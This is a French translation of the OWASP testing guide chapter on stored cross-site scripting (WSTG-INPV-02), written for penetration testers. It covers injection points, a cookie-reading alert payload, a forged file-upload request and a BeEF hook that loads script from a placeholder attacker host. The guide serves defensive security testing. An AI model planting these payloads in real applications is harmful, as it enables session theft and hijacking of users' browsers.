# Test des scripts intersites stockés

|ID          |
|------------|
|WSTG-INPV-02|

## Sommaire

Le [Cross-site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) stocké  est le type le plus dangereux de Cross Site Scripting. Les applications Web qui permettent aux utilisateurs de stocker des données sont potentiellement exposées à ce type d'attaque. Ce chapitre illustre des exemples d'injection de scripts intersites stockés et des scénarios d'exploitation associés.

Le XSS stocké se produit lorsqu'une application Web recueille les entrées d'un utilisateur qui pourraient être malveillantes, puis stocke ces entrées dans un magasin de données pour une utilisation ultérieure. L'entrée stockée n'est pas correctement filtrée. Par conséquent, les données malveillantes apparaîtront comme faisant partie du site Web et s'exécuteront dans le navigateur de l'utilisateur avec les privilèges de l'application Web. Étant donné que cette vulnérabilité implique généralement au moins deux requêtes à l'application, cela peut également être appelé XSS de second ordre.

Cette vulnérabilité peut être utilisée pour mener un certain nombre d'attaques basées sur un navigateur, notamment :

- Détourner le navigateur d'un autre utilisateur
- Capturer les informations sensibles vues par les utilisateurs de l'application
- Pseudo dégradation de l'application
- Balayage des ports des hosts internes ("internes" par rapport aux utilisateurs de l'application web)
- Livraison dirigée d'exploits basés sur un navigateur
- Autres activités malveillantes

Le XSS stocké n'a pas besoin d'un lien malveillant pour être exploité. Une exploitation réussie se produit lorsqu'un utilisateur visite une page avec un XSS stocké. Les phases suivantes concernent un scénario d'attaque XSS stocké typique :

- L'attaquant stocke le code malveillant dans la page vulnérable
- L'utilisateur s'authentifie dans l'application
- L'utilisateur visite la page vulnérable
- Un code malveillant est exécuté par le navigateur de l'utilisateur

Ce type d'attaque peut également être exploité avec des cadres d'exploitation de navigateur tels que [BeEF](https://beefproject.com) et [XSS Proxy](http://xss-proxy.sourceforge.net/). Ces frameworks permettent le développement d'exploits JavaScript complexes.

Le XSS stocké est particulièrement dangereux dans les zones d'application auxquelles les utilisateurs disposant de privilèges élevés ont accès. Lorsque l'administrateur visite la page vulnérable, l'attaque est automatiquement exécutée par son navigateur. Cela peut exposer des informations sensibles telles que les jetons d'autorisation de session.

## Objectifs des tests

- Identifiez les entrées stockées qui sont reflétées côté client.
- Évaluez l'entrée qu'ils acceptent et l'encodage qui est appliqué au retour (le cas échéant).

## Comment tester

### Test en boîte noire

Le processus d'identification des vulnérabilités XSS stockées est similaire au processus décrit lors du [test du XSS reflété](01-Testing_for_Reflected_Cross_Site_Scripting.md).

#### Formulaires de saisie

La première étape consiste à identifier tous les points où l'entrée de l'utilisateur est stockée dans le back-end, puis affichée par l'application. Des exemples typiques d'entrées utilisateur stockées peuvent être trouvés dans :

- Page Utilisateur/Profils : l'application permet à l'utilisateur de modifier/modifier les détails du profil tels que le prénom, le nom, le surnom, l'avatar, la photo, l'adresse, etc.
- Panier : l'application permet à l'utilisateur de stocker des articles dans le panier qui peuvent ensuite être revus plus tard
- File Manager : application qui permet de télécharger des fichiers
- Paramètres/préférences de l'application : application qui permet à l'utilisateur de définir ses préférences
- Forum/Message board : application qui permet l'échange de messages entre utilisateurs
- Blog : si l'application de blog permet aux utilisateurs de soumettre des commentaires
- Journal : si l'application stocke certaines entrées des utilisateurs dans des journaux.

#### Analyser le code HTML

L'entrée stockée par l'application est normalement utilisée dans les balises HTML, mais elle peut également être trouvée dans le cadre du contenu JavaScript. A ce stade, il est fondamental de comprendre si l'entrée est stockée et comment elle est positionnée dans le contexte de la page. Contrairement au XSS réfléchi, le testeur de stylet doit également étudier tous les canaux hors bande par lesquels l'application reçoit et stocke les entrées des utilisateurs.

**Remarque** : Toutes les zones de l'application accessibles par les administrateurs doivent être testées pour identifier la présence de toute donnée soumise par les utilisateurs.

**Exemple** : Envoyer par e-mail les données stockées dans `index2.php`

![Exemple d'entrée stockée](images/Stored_input_example.jpg)\
*Figure 4.7.2-1 : Exemple d'entrée stockée*

Le code HTML de index2.php où se trouve la valeur email :

```html
<input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com" />
```

Dans ce cas, le testeur doit trouver un moyen d'injecter du code en dehors de la balise `<input>` comme ci-dessous :

```html
<input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com"> MALICIOUS CODE <!-- />
```

#### Test du XSS stocké

Cela implique de tester la validation des entrées et les contrôles de filtrage de l'application. Exemples d'injection de base dans ce cas :

- `aaa@aa.com&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;`
- `aaa@aa.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E`

Assurez-vous que l'entrée est soumise via l'application. Cela implique normalement de désactiver JavaScript si des contrôles de sécurité côté client sont mis en œuvre ou de modifier la requête HTTP avec un proxy Web. Il est également important de tester la même injection avec les requêtes HTTP GET et POST. L'injection ci-dessus entraîne une fenêtre contextuelle contenant les valeurs des cookies.

> ![Exemple XSS stocké](images/Stored_xss_example.jpg)\
> *Figure 4.7.2-2 : Exemple d'entrée stockée*
>
> Le code HTML suite à l'injection :
>
> ```html
> <input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com"><script>alert(document.cookie)</script>
> ```
>
> L'entrée est stockée et la charge utile XSS est exécutée par le navigateur lors du rechargement de la page. Si l'entrée est échappée par l'application, les testeurs doivent tester l'application pour les filtres XSS. Par exemple, si la chaîne "SCRIPT" est remplacée par un espace ou par un caractère NULL, cela pourrait être un signe potentiel de filtrage XSS en action. De nombreuses techniques existent pour échapper aux filtres d'entrée (voir le chapitre [test du XSS réfléchi](01-Testing_for_Reflected_Cross_Site_Scripting.md))). Il est fortement recommandé aux testeurs de se référer à [XSS Filter Evasion](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) et [Mario](https://cybersecurity.wtf/encoder/) Pages XSS Cheat, qui fournissent une longue liste d'attaques XSS et de contournements de filtrage. Reportez-vous à la section des livres blancs et des outils pour des informations plus détaillées.

#### Tirez parti du XSS stocké avec BeEF

Le XSS stocké peut être exploité par des cadres d'exploitation JavaScript avancés tels que [BeEF](https://www.beefproject.com) et [XSS Proxy](http://xss-proxy.sourceforge.net/).

Un scénario d'exploitation typique de BeEF implique :

- Injecter un crochet JavaScript qui communique avec le framework d'exploitation du navigateur de l'attaquant (BeEF)
- Attendre que l'utilisateur de l'application visualise la page vulnérable où l'entrée stockée est affichée
- Contrôler le navigateur de l'utilisateur de l'application via la console BeEF

Le crochet JavaScript peut être injecté en exploitant la vulnérabilité XSS dans l'application Web.

**Exemple** : Injection BeEF dans `index2.php` :

```html
aaa@aa.com"><script src=http://attackersite/hook.js></script>
```

Lorsque l'utilisateur charge la page `index2.php`, le script `hook.js` est exécuté par le navigateur. Il est alors possible d'accéder aux cookies, à la capture d'écran de l'utilisateur, au presse-papiers de l'utilisateur et de lancer des attaques XSS complexes.

> ![Exemple d'injection de bœuf](images/RubyBeef.png)\
> *Figure 4.7.2-3 : Exemple d'injection de bœuf*
>
> Cette attaque est particulièrement efficace dans les pages vulnérables qui sont consultées par de nombreux utilisateurs avec des privilèges différents.

#### Téléchargement de fichiers

Si l'application Web permet le téléchargement de fichiers, il est important de vérifier s'il est possible de télécharger du contenu HTML. Par exemple, si les fichiers HTML ou TXT sont autorisés, la charge utile XSS peut être injectée dans le fichier téléchargé. Le testeur d'intrusion doit également vérifier si le téléchargement du fichier permet de définir des types MIME arbitraires.

Considérez la requête HTTP POST suivante pour le téléchargement de fichiers :

```http
POST /fileupload.aspx HTTP/1.1
[…]
Content-Disposition: form-data; name="uploadfile1"; filename="C:\Documents and Settings\test\Desktop\test.txt"
Content-Type: text/plain

test
```

Ce défaut de conception peut être exploité dans les attaques de mauvaise gestion MIME du navigateur. Par exemple, des fichiers d'aspect inoffensif comme JPG et GIF peuvent contenir une charge utile XSS qui est exécutée lorsqu'ils sont chargés par le navigateur. Ceci est possible lorsque le type MIME d'une image telle que `image/gif` peut à la place être défini sur `text/html`. Dans ce cas, le fichier sera traité par le navigateur client comme HTML.

Requête HTTP POST falsifiée :

```html
Content-Disposition: form-data; name="uploadfile1"; filename="C:\Documents and Settings\test\Desktop\test.gif"
Content-Type: text/html

<script>alert(document.cookie)</script>
```

Considérez également qu'Internet Explorer ne gère pas les types MIME de la même manière que Mozilla Firefox ou d'autres navigateurs. Par exemple, Internet Explorer gère les fichiers TXT avec du contenu HTML comme du contenu HTML. Pour plus d'informations sur la gestion MIME, reportez-vous à la section des livres blancs au bas de ce chapitre.

### Script intersite aveugle

Blind Cross-site Scripting est une forme de XSS stocké. Cela se produit généralement lorsque la charge utile de l'attaquant est enregistrée sur le serveur/l'infrastructure et renvoyée ultérieurement à la victime à partir de l'application principale. Par exemple, dans les formulaires de commentaires, un attaquant peut soumettre la charge utile malveillante à l'aide du formulaire, et une fois que l'utilisateur/administrateur principal de l'application a vu la soumission de l'attaquant via l'application principale, la charge utile de l'attaquant sera exécutée. Blind Cross-site Scripting est difficile à confirmer dans le scénario du monde réel, mais l'un des meilleurs outils pour cela est [XSS Hunter](https://xsshunter.com/).

> Remarque : Les testeurs doivent examiner attentivement les implications en matière de confidentialité de l'utilisation de services publics ou tiers lors de la réalisation de tests de sécurité. (Voir #outils.)

### Test en boîte grise

Les tests en boîte grise sont similaires aux tests en boîte noire. Dans les tests en boîte grise, le pen-testeur a une connaissance partielle de l'application. Dans ce cas, les informations concernant l'entrée de l'utilisateur, les contrôles de validation des entrées et le stockage des données peuvent être connues du testeur de stylo.

En fonction des informations disponibles, il est normalement recommandé que les testeurs vérifient comment les entrées utilisateur sont traitées par l'application, puis stockées dans le système back-end. Les étapes suivantes sont recommandées :

- Utilisez l'application frontale et entrez une entrée avec des caractères spéciaux/invalides
- Analyser la/les réponse(s) de l'application
- Identifier la présence de contrôles de validation des entrées
- Accédez au système back-end et vérifiez si l'entrée est stockée et comment elle est stockée
- Analyser le code source et comprendre comment l'entrée stockée est rendue par l'application

Si le code source est disponible (comme dans les tests en boîte blanche), toutes les variables utilisées dans les formulaires de saisie doivent être analysées. En particulier, les langages de programmation tels que PHP, ASP et JSP utilisent des variables/fonctions prédéfinies pour stocker les entrées des requêtes HTTP GET et POST.

Le tableau suivant résume certaines variables et fonctions spéciales à examiner lors de l'analyse du code source :

| **PHP**        | **ASP**           |  **JSP**         |
|----------------|-------------------|------------------|
| `$_GET` - HTTP GET variables  | `Request.QueryString` - HTTP GET | `doGet`, `doPost` servlets - HTTP GET and POST |
| `$_POST` - HTTP POST variables| `Request.Form` - HTTP POST | `request.getParameter` - HTTP GET/POST variables |
| `$_REQUEST` – HTTP POST, GET and COOKIE variables | `Server.CreateObject` - used to upload files |
| `$_FILES` - HTTP File Upload variables |

**Remarque** : Le tableau ci-dessus n'est qu'un résumé des paramètres les plus importants, mais tous les paramètres d'entrée utilisateur doivent être étudiés.

## Outils

- [PHP Charset Encoder(PCE)](https://cybersecurity.wtf/encoder/) vous aide à encoder des textes arbitraires vers et depuis 65 types de jeux de caractères que vous pouvez utiliser dans vos charges utiles personnalisées.
- [Hackvertor](https://hackvertor.co.uk/public) est un outil en ligne qui permet de nombreux types d'encodage et d'obscurcissement de JavaScript (ou de toute entrée de chaîne).
- [BeEF](https://www.beefproject.com) est le cadre d'exploitation du navigateur. Un outil professionnel pour démontrer l'impact en temps réel des vulnérabilités du navigateur.
- [XSS-Proxy](http://xss-proxy.sourceforge.net/) est un outil avancé d'attaque Cross-Site-Scripting (XSS).
- [Burp Proxy](https://portswigger.net/burp/) est un serveur proxy HTTP/S interactif pour attaquer et tester des applications Web.
- [XSS Assistant](https://www.greasespot.net/) Script Greasemonkey qui permet aux utilisateurs de tester facilement n'importe quelle application Web pour les failles de cross-site-scripting.
- [OWASP Zed Attack Proxy (ZAP)](https://www.zaproxy.org) est un serveur proxy HTTP/S interactif pour attaquer et tester des applications Web avec un scanner intégré.
- [XSS Hunter Portable](https://github.com/mandatoryprogrammer/xsshunter) XSS Hunter trouve toutes sortes de vulnérabilités de script intersite, y compris le XSS aveugle souvent manqué.

## Références

### Ressources OWASP

- [Fiche de triche pour l'évasion du filtre XSS](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)

### Livres

- Joel Scambray, Mike Shema, Caleb Sima - "Hacking Exposed Web Applications", deuxième édition, McGraw-Hill, 2006 - ISBN 0-07-226229-0
- Dafydd Stuttard, Marcus Pinto - "Le manuel de l'application Web - Découvrir et exploiter les failles de sécurité", 2008, Wiley, ISBN 978-0-470-17077-9
- Jeremiah Grossman, Robert "RSnake" Hansen, Petko "pdp" D. Petkov, Anton Rager, Seth Fogie - "Cross Site Scripting Attacks: XSS Exploits and Defense", 2007, Syngress, ISBN-10 : 1-59749-154- 3

### Papiers blanc

- [CERT : "Avis CERT CA-2000-02 Balises HTML malveillantes intégrées dans les requêtes Web des clients"](https://resources.sei.cmu.edu/library/asset-view.cfm?assetID=496186)
- [Amit Klein : "explication des scripts intersites"](https://courses.csail.mit.edu/6.857/2009/handouts/css-explained.pdf)
- [Gunter Ollmann : "Injection de code HTML et script intersite"](http://www.technicalinfo.net/papers/CSS.html)
- [CGISecurity.com : "La FAQ sur les scripts intersites"](https://www.cgisecurity.com/xss-faq.html)
